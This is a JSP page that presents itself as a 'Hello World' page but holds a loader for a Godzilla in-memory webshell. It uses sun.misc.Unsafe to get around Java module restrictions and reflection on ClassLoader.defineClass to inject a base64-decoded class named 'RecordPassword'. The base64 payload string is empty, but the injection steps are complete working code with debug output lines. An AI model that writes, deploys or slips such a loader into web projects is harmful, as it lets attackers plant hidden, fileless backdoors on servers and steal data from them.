<%@ page import="com.sun.tools.javac.Main" %>
<%@ page import="sun.misc.Unsafe" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Base64" %>
<html>
<head><title>Hello World</title></head>
<body>
Hello World!<br/>
<%
try{
    out.println("bbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
    String godzillaMemShellClassBase64 = "";
    byte[] bytes = Base64.getDecoder().decode(godzillaMemShellClassBase64);
    Class unsafeClass = Class.forName("sun.misc.Unsafe");
    Field field = unsafeClass.getDeclaredField("theUnsafe");
    field.setAccessible(true);
    Unsafe unsafe = (Unsafe) field.get(null);
    Module baseModule = Object.class.getModule();
    Class currentClass = Main.class;
    long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
    out.println("ccccccccccccccccccc");
    unsafe.putObject(currentClass, offset, baseModule);
    out.println("ddddddddd");
    Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    out.println("eeeeee");
    method.setAccessible(true);
    out.println("ffffffff");
    ((Class)method.invoke(ClassLoader.getSystemClassLoader(), "RecordPassword", bytes, 0, bytes.length)).newInstance();
    out.println("ggggggggggggggg");
}catch (Exception e){

    out.println("aaaaaaaaaaaaaaaaaaa");
}

%>
</body>
</html>
